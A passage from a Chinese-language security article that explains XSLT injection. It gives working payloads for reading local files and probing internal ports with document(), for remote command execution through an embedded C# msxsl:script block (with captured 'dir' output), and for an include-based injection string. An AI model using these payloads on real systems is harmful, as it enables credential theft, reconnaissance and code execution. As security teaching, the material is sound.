2px;">&nbsp;</span></p><p style="margin-left: 8px;margin-right: 8px;"><img src="http://mmbiz.qpic.cn/mmbiz_png/1UG7KPNHN8GlWVRaibwJzM4abyJfpkymu1G5OcCicNPwrAYP6r01DLojtGyCQCmEksqefQJBStyxIKrS67IyuKhw/0?wx_fmt=png" style="width: 643px !important; height: 190px !important;"></p><p style="margin-left: 8px;margin-right: 8px;"><span style="font-size: 15px;letter-spacing: 2px;"></span><br></p><p style="margin-left: 8px;margin-right: 8px;"><span style="font-size: 15px;letter-spacing: 2px;">攻击者可以使用这种技术对受害者的内部网络进行侦察扫描。</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="font-size: 15px;letter-spacing: 2px;"><br></span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="font-size: 15px;letter-spacing: 2px;"><br></span></p><h2 style="margin-left: 8px;margin-right: 8px;"><span style="color: rgb(0, 81, 171);font-size: 16px;"><strong><span style="font-size: 16px;letter-spacing: 2px;">使用 document() 函数窃取信息、扫描端口</span></strong></span></h2><p><br></p><p style="margin-left: 8px;margin-right: 8px;"><span style="font-size: 15px;letter-spacing: 2px;">document() 函数赋予了 XSLT 文档访问外部 XML 文档中除了主数据源之外的数据的能力。</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="font-size: 15px;letter-spacing: 2px;">&nbsp;</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="font-size: 15px;letter-spacing: 2px;">通过将所有内容复制到转换结果中，该函数可以被滥用于读取远程系统上的文件。被读取的文件需要是一个格式正确的
 XML 文档，但这基本上不算问题，因为敏感信息通常就是被存储在 XML 文件中。例如 ASP .NET Web 应用中的 web.config
 文件就是一个很好的目标，因为该文件可能包含了数据库证书。</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="font-size: 15px;letter-spacing: 2px;">&nbsp;</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="font-size: 15px;letter-spacing: 2px;">看一个例子。下面的 XSLT 文档可用于窃取 "C:\secrectfruit.xml" 文件中的内容：</span></p><blockquote><p style="margin-left: 8px;margin-right: 8px;"><span style="letter-spacing: normal;font-size: 12px;">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="letter-spacing: normal;font-size: 12px;">&lt;xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform"&gt;</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="letter-spacing: normal;font-size: 12px;">&nbsp;&nbsp;&lt;xsl:template match="/fruits"&gt;</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="letter-spacing: normal;font-size: 12px;">&nbsp;&nbsp;&nbsp;&nbsp;&lt;xsl:copy-of select="document('C:\secretfruit.xml')"/&gt;</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="letter-spacing: normal;font-size: 12px;">&nbsp;&nbsp;&nbsp;&nbsp;Fruits:</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="letter-spacing: normal;font-size: 12px;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;!-- Loop for each fruit --&gt;</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="letter-spacing: normal;font-size: 12px;">&nbsp;&nbsp;&nbsp;&nbsp;&lt;xsl:for-each select="fruit"&gt;</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="letter-spacing: normal;font-size: 12px;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;!-- Print name: description --&gt;</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="letter-spacing: normal;font-size: 12px;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;- &lt;xsl:value-of select="name"/&gt;: &lt;xsl:value-of select="description"/&gt;</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="letter-spacing: normal;font-size: 12px;">&nbsp;&nbsp;&nbsp;&nbsp;&lt;/xsl:for-each&gt;</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="letter-spacing: normal;font-size: 12px;">&nbsp;&nbsp;&lt;/xsl:template&gt;</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="letter-spacing: normal;font-size: 12px;">&lt;/xsl:stylesheet&gt;</span></p></blockquote><p style="margin-left: 8px;margin-right: 8px;"><span style="font-size: 15px;letter-spacing: 2px;"><br></span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="font-size: 15px;letter-spacing: 2px;">转换结果在顶部显示了该秘密文件中的内容。</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="font-size: 15px;letter-spacing: 2px;"><br></span></p><blockquote><p style="margin-left: 8px;margin-right: 8px;"><span style="letter-spacing: normal;font-size: 12px;">&lt;fruits&gt;</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="letter-spacing: normal;font-size: 12px;">&nbsp;&nbsp;&lt;fruit&gt;</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="letter-spacing: normal;font-size: 12px;">&nbsp;&nbsp;&nbsp;&nbsp;&lt;name&gt;Golden Apple&lt;/name&gt;</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="letter-spacing: normal;font-size: 12px;">&nbsp;&nbsp;&nbsp;&nbsp;&lt;description&gt;Round, made of Gold&lt;/description&gt;</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="letter-spacing: normal;font-size: 12px;">&nbsp;&nbsp;&lt;/fruit&gt;</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="letter-spacing: normal;font-size: 12px;">&lt;/fruits&gt;</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="letter-spacing: normal;font-size: 12px;">&nbsp;&nbsp;&nbsp;&nbsp;Fruits:</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="letter-spacing: normal;font-size: 12px;">&nbsp;</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="letter-spacing: normal;font-size: 12px;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;- Lemon: Yellow and sour</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="letter-spacing: normal;font-size: 12px;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;- Watermelon: Round, green outside, red inside</span></p></blockquote><p style="margin-left: 8px;margin-right: 8px;"><span style="font-size: 15px;letter-spacing: 2px;"><br></span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="font-size: 15px;letter-spacing: 2px;">与 XXE 攻击类似，document() 函数可被用于取出远程系统中的文档，也可使用 UNC 路径或者 URL 进行简单的端口扫描。下面是一个使用 URL 执行端口扫描的 XSLT 文档：</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="font-size: 15px;letter-spacing: 2px;"><br></span></p><blockquote><p style="margin-left: 8px;margin-right: 8px;"><span style="letter-spacing: normal;font-size: 12px;">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="letter-spacing: normal;font-size: 12px;">&lt;xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform"&gt;</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="letter-spacing: normal;font-size: 12px;">&nbsp;&nbsp;&lt;xsl:template match="/fruits"&gt;</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="letter-spacing: normal;font-size: 12px;">&nbsp;&nbsp;&nbsp;&nbsp;&lt;xsl:copy-of select="document('http://172.16.132.1:25')"/&gt;</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="letter-spacing: normal;font-size: 12px;">&nbsp;&nbsp;&nbsp;&nbsp;Fruits:</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="letter-spacing: normal;font-size: 12px;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;!-- Loop for each fruit --&gt;</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="letter-spacing: normal;font-size: 12px;">&nbsp;&nbsp;&nbsp;&nbsp;&lt;xsl:for-each select="fruit"&gt;</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="letter-spacing: normal;font-size: 12px;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;!-- Print name: description --&gt;</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="letter-spacing: normal;font-size: 12px;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;- &lt;xsl:value-of select="name"/&gt;: &lt;xsl:value-of select="description"/&gt;</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="letter-spacing: normal;font-size: 12px;">&nbsp;&nbsp;&nbsp;&nbsp;&lt;/xsl:for-each&gt;</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="letter-spacing: normal;font-size: 12px;">&nbsp;&nbsp;&lt;/xsl:template&gt;</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="letter-spacing: normal;font-size: 12px;">&lt;/xsl:stylesheet&gt;</span></p></blockquote><h2 style="margin-left: 8px;margin-right: 8px;"><br></h2><p><br></p><h2 style="margin-left: 8px;margin-right: 8px;"><span style="color: rgb(0, 81, 171);font-size: 16px;"><strong><span style="color: rgb(0, 81, 171);letter-spacing: 2px;">使用嵌入式脚本块进行远程代码执行</span></strong></span></h2><p><br></p><p style="margin-left: 8px;margin-right: 8px;"><span style="font-size: 15px;letter-spacing: 2px;">嵌入式脚本块属于专有 XSLT 扩展的功能，允许将代码直接包含在 XSLT 文档中。例如在微软的实现中，可以包含 C# 代码。当文档被解析后，包含在其中的代码会被远程服务器编译运行。</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="font-size: 15px;letter-spacing: 2px;">&nbsp;</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="font-size: 15px;letter-spacing: 2px;">下面这个 XSLT 文档就是一个 </span><span style="font-size: 15px;letter-spacing: 2px;">PoC</span><span style="font-size: 15px;letter-spacing: 2px;"> ，功能为列出当前工作目录下所有文件。</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="font-size: 15px;letter-spacing: 2px;"><br></span></p><blockquote><p style="margin-left: 8px;margin-right: 8px;"><span style="letter-spacing: normal;font-size: 12px;">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="letter-spacing: normal;font-size: 12px;">&lt;xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform"</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="letter-spacing: normal;font-size: 12px;">xmlns:msxsl="urn:schemas-microsoft-com:xslt"</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="letter-spacing: normal;font-size: 12px;">xmlns:user="urn:my-scripts"&gt;</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="letter-spacing: normal;font-size: 12px;">&nbsp;</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="letter-spacing: normal;font-size: 12px;">&lt;msxsl:script language = "C#" implements-prefix = "user"&gt;</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="letter-spacing: normal;font-size: 12px;">&lt;![CDATA[</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="letter-spacing: normal;font-size: 12px;">public string execute(){</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="letter-spacing: normal;font-size: 12px;">System.Diagnostics.Process proc = new System.Diagnostics.Process();</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="letter-spacing: normal;font-size: 12px;">proc.StartInfo.FileName= "C:\\windows\\system32\\cmd.exe";</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="letter-spacing: normal;font-size: 12px;">proc.StartInfo.RedirectStandardOutput = true;</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="letter-spacing: normal;font-size: 12px;">proc.StartInfo.UseShellExecute = false;</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="letter-spacing: normal;font-size: 12px;">proc.StartInfo.Arguments = "/c dir";</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="letter-spacing: normal;font-size: 12px;">proc.Start();</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="letter-spacing: normal;font-size: 12px;">proc.WaitForExit();</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="letter-spacing: normal;font-size: 12px;">return proc.StandardOutput.ReadToEnd();</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="letter-spacing: normal;font-size: 12px;">}</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="letter-spacing: normal;font-size: 12px;">]]&gt;</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="letter-spacing: normal;font-size: 12px;">&lt;/msxsl:script&gt;</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="letter-spacing: normal;font-size: 12px;">&nbsp;</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="letter-spacing: normal;font-size: 12px;">&nbsp;&nbsp;&lt;xsl:template match="/fruits"&gt;</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="letter-spacing: normal;font-size: 12px;">&nbsp;&nbsp;--- BEGIN COMMAND OUTPUT ---</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="letter-spacing: normal;font-size: 12px;">&nbsp;&nbsp;&nbsp;&nbsp;&lt;xsl:value-of select="user:execute()"/&gt;</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="letter-spacing: normal;font-size: 12px;">&nbsp;&nbsp;--- END COMMAND OUTPUT ---&nbsp;&nbsp;&nbsp;</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="letter-spacing: normal;font-size: 12px;">&nbsp;&nbsp;&lt;/xsl:template&gt;</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="letter-spacing: normal;font-size: 12px;">&lt;/xsl:stylesheet&gt;</span></p></blockquote><p style="margin-left: 8px;margin-right: 8px;"><span style="font-size: 15px;letter-spacing: 2px;"><br></span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="font-size: 15px;letter-spacing: 2px;">首先我们在 "xsl:stylesheet" 标签中定义了两个新的 XML 前缀。第一个 "xmlns:msxsl" 启用了微软的专有架构扩展，第二个 "xmlns:user" 声明了一个通过 "msxsl:script" 脚本块实现的用户自定义扩展。</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="font-size: 15px;letter-spacing: 2px;">&nbsp;</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="font-size: 15px;letter-spacing: 2px;">上述 C# 代码实现了一个 execute() 函数，该函数先执行了命令"cmd.exe /c dir"，然后以字符串的形式返回了该命令的输出。</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="font-size: 15px;letter-spacing: 2px;">&nbsp;</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="font-size: 15px;letter-spacing: 2px;">最后该函数在"xsl:value-of"标签中被调用。</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="font-size: 15px;letter-spacing: 2px;">&nbsp;</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="font-size: 15px;letter-spacing: 2px;">上述转换的结果其实与在 Windows 命令行中使用命令 "dir" 的输出一模一样。</span></p><blockquote><p style="margin-left: 8px;margin-right: 8px;"><span style="letter-spacing: normal;font-size: 12px;">--- BEGIN COMMAND OUTPUT ---</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="letter-spacing: normal;font-size: 12px;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Volume in drive C has no label.</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="letter-spacing: normal;font-size: 12px;">&nbsp;Volume Serial Number is EC7C-74AD</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="letter-spacing: normal;font-size: 12px;">&nbsp;</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="letter-spacing: normal;font-size: 12px;">&nbsp;Directory of C:\Users\context\Documents\Visual Studio 2015\Projects\XsltConsole</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="letter-spacing: normal;font-size: 12px;">Application\XsltConsoleApplication\bin\Debug</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="letter-spacing: normal;font-size: 12px;">&nbsp;</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="letter-spacing: normal;font-size: 12px;">22/02/2017&nbsp; 15:19&nbsp;&nbsp;&nbsp; &lt;DIR&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; .</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="letter-spacing: normal;font-size: 12px;">22/02/2017&nbsp; 15:19&nbsp;&nbsp;&nbsp; &lt;DIR&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ..</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="letter-spacing: normal;font-size: 12px;">22/02/2017&nbsp; 13:30&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 258 data.xml</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="letter-spacing: normal;font-size: 12px;">22/02/2017&nbsp; 14:48&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 233 external_transform.xslt</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="letter-spacing: normal;font-size: 12px;">22/02/2017&nbsp; 15:15&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 12 secretfruit.txt</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="letter-spacing: normal;font-size: 12px;">31/01/2017&nbsp; 13:45&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 154 secretfruit.xml</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="letter-spacing: normal;font-size: 12px;">22/02/2017&nbsp; 15:29&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 831 transform.xslt</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="letter-spacing: normal;font-size: 12px;">22/02/2017&nbsp; 13:49&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 7,168 XsltConsoleApplication.exe</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="letter-spacing: normal;font-size: 12px;">26/01/2017&nbsp; 15:42&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 189 XsltConsoleApplication.exe.config</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="letter-spacing: normal;font-size: 12px;">22/02/2017&nbsp; 13:49&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 11,776 XsltConsoleApplication.pdb</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="letter-spacing: normal;font-size: 12px;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;8 File(s)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20,621 bytes</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="letter-spacing: normal;font-size: 12px;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;2 Dir(s)&nbsp;&nbsp; 9,983,107,072 bytes free</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="letter-spacing: normal;font-size: 12px;">&nbsp;</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="letter-spacing: normal;font-size: 12px;">&nbsp;&nbsp;--- END COMMAND OUTPUT ---</span></p></blockquote><h2 style="margin-left: 8px;margin-right: 8px;"><br></h2><p><br></p><h2 style="margin-left: 8px;margin-right: 8px;"><span style="color: rgb(0, 81, 171);font-size: 16px;"><strong><span style="color: rgb(0, 81, 171);letter-spacing: 2px;">江湖救急：import 、include</span></strong></span></h2><p style="margin-left: 8px;margin-right: 8px;"><span style="font-size: 15px;letter-spacing: 2px;"><br></span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="font-size: 15px;letter-spacing: 2px;">import 和 include 标签可被用于关联多个 XSLT 文档。</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="font-size: 15px;letter-spacing: 2px;">&nbsp;</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="font-size: 15px;letter-spacing: 2px;">如果我们遇到了这样的情况：只能在
 XSLT 文档中间部分注入。这样一来，便不能直接使用 XML 
外部实体攻击或者嵌入式脚本块了，因为这两者都需要注入点在文件的最顶端。</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="font-size: 15px;letter-spacing: 2px;"><br></span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="font-size: 15px;letter-spacing: 2px;">此时，import 和 include 
便可用来克服此类限制，具体来讲就是给该 XSLT 
文档关联一个外部文档。当外部文档被加载后，整个文档会被解析，如果攻击者可以控制这个外部文档，那他们就可以在该外部文档中使用 XML 
外部实体或嵌入式脚本了。这个外部文档可以是提前上传到服务器的文件，也可以是一个使用 URL 引用的位于攻击者电脑上的文件，只要文件内容是 XML
 即可。</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="font-size: 15px;letter-spacing: 2px;">&nbsp;</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="font-size: 15px;letter-spacing: 2px;">值得注意的是，"xsl:import" 标签只能作为 "xsl:stylesheet" 标签的第一个孩子使用，但是 "xsl:include" 标签则没有此限制。</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="font-size: 15px;letter-spacing: 2px;">&nbsp;</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="font-size: 15px;letter-spacing: 2px;">此处使用了与之前一模一样的 XSLT 文档，同时假设我们只能在字符串 "Your Company Name Here" 这里注入。</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="font-size: 15px;letter-spacing: 2px;"><br></span></p><blockquote><p style="margin-left: 8px;margin-right: 8px;"><span style="letter-spacing: normal;font-size: 12px;">&lt;?xml version=”1.0” encoding=”utf-8"?&gt;</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="letter-spacing: normal;font-size: 12px;">&lt;xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform"&gt;</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="letter-spacing: normal;font-size: 12px;">&nbsp;&nbsp;&lt;xsl:template match="/fruits"&gt;</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="letter-spacing: normal;font-size: 12px;">&nbsp;&nbsp;&nbsp;&nbsp;Your Company Name Here</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="letter-spacing: normal;font-size: 12px;">&nbsp;&nbsp;&nbsp;&nbsp;Fruits:</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="letter-spacing: normal;font-size: 12px;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;!-- Loop for each fruit --&gt;</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="letter-spacing: normal;font-size: 12px;">&nbsp;&nbsp;&nbsp;&nbsp;&lt;xsl:for-each select="fruit"&gt;</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="letter-spacing: normal;font-size: 12px;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;!-- Print name: description --&gt;</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="letter-spacing: normal;font-size: 12px;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;- &lt;xsl:value-of select="name"/&gt;: &lt;xsl:value-of select="description"/&gt;</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="letter-spacing: normal;font-size: 12px;">&nbsp;&nbsp;&nbsp;&nbsp;&lt;/xsl:for-each&gt;</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="letter-spacing: normal;font-size: 12px;">&nbsp;&nbsp;&lt;/xsl:template&gt;</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="letter-spacing: normal;font-size: 12px;">&nbsp;&nbsp;&lt;xsl:include href="external_transform.xslt"/&gt;</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="letter-spacing: normal;font-size: 12px;">&lt;/xsl:stylesheet&gt;</span></p></blockquote><p style="margin-left: 8px;margin-right: 8px;"><span style="font-size: 15px;letter-spacing: 2px;"><br></span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="font-size: 15px;letter-spacing: 2px;">我们想要关联下面名为 "external_transform.xslt" 的外部 XSLT 
文档。为了简化问题，此处该外部文档只是简单地打印了一条消息。但是值得一提的是，该外部文档可以替换为前面已经介绍过任意一个 XSLT 
文档，包括那些需要在文件最顶部声明的文档，比如那个不能在此处直接使用的包含了嵌入式脚本块的文档。</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="font-size: 15px;letter-spacing: 2px;"><br></span></p><blockquote><p style="margin-left: 8px;margin-right: 8px;"><span style="letter-spacing: normal;font-size: 12px;">&lt;?xml version=”1.0” encoding=”utf-8”?&gt;</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="letter-spacing: normal;font-size: 12px;">&lt;xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform"&gt;</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="letter-spacing: normal;font-size: 12px;">&nbsp;&nbsp;&nbsp;&nbsp;&lt;xsl:template match="/"&gt;</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="letter-spacing: normal;font-size: 12px;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Hello from the external transformation</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="letter-spacing: normal;font-size: 12px;">&nbsp;&nbsp;&nbsp;&nbsp;&lt;/xsl:template&gt;</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="letter-spacing: normal;font-size: 12px;">&lt;/xsl:stylesheet&gt;</span></p></blockquote><p style="margin-left: 8px;margin-right: 8px;"><span style="font-size: 15px;letter-spacing: 2px;"><br></span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="font-size: 15px;letter-spacing: 2px;">为了包含外部文档，我们需要插入以下标签。</span></p><blockquote><p style="margin-left: 8px;margin-right: 8px;"><span style="letter-spacing: normal;font-size: 12px;">&lt;xsl:include href="external_transform.xslt"/&gt;</span></p></blockquote><p style="margin-left: 8px;margin-right: 8px;"><span style="font-size: 15px;letter-spacing: 2px;"><br></span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="font-size: 15px;letter-spacing: 2px;">但是这里有个问题，那就是 "xsl:include"标签不能被包含在 "xsl:template" 标签之内，同时插入 include 
标签的文件还必须是一个格式正确的 XML 文件。</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="font-size: 15px;letter-spacing: 2px;"><br></span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="font-size: 15px;letter-spacing: 2px;">所以，第一步我们要做的就是关闭 "xsl:template" 标签，然后我们才能插入 
"xsl:include" 标签，这样就满足了第一个条件。但是为了满足第二个条件，我们又需要在插入 "xsl:include" 标签之后重新打开
 "xsl:template" 标签。于是最后的结果变成了这个样子：</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="font-size: 15px;letter-spacing: 2px;"><br></span></p><blockquote><p style="margin-left: 8px;margin-right: 8px;"><span style="letter-spacing: normal;font-size: 12px;">&lt;/xsl:template&gt;&lt;xsl:include href="external_transform.xslt"/&gt;&lt;xsl:template name="a"&gt;</span></p></blockquote><p style="margin-left: 8px;margin-right: 8px;"><span style="font-size: 15px;letter-spacing: 2px;"><br></span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="font-size: 15px;letter-spacing: 2px;">完成注入后，最终 XSLT 文档差不多如下：</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="font-size: 15px;letter-spacing: 2px;"><br></span></p><blockquote><p style="margin-left: 8px;margin-right: 8px;"><span style="letter-spacing: normal;font-size: 12px;">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="letter-spacing: normal;font-size: 12px;">&lt;xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform"&gt;</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="letter-spacing: normal;font-size: 12px;">&nbsp;&nbsp;&lt;xsl:template match="/fruits"&gt;</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="letter-spacing: normal;font-size: 12px;">&nbsp;&nbsp;&nbsp;&nbsp;&lt;/xsl:template&gt;&lt;xsl:include href="external_transform.xslt"/&gt;&lt;xsl:template name="a"&gt;</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="letter-spacing: normal;font-size: 12px;">&nbsp;&nbsp;&nbsp;&nbsp;Fruits:</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="letter-spacing: normal;font-size: 12px;">&nbsp;&nbsp;&nbsp;&nbsp;&lt;!-- Loop for each fruit --&gt;</span></p><p style="margin-left: 8px;margin-right: 8px;"><span 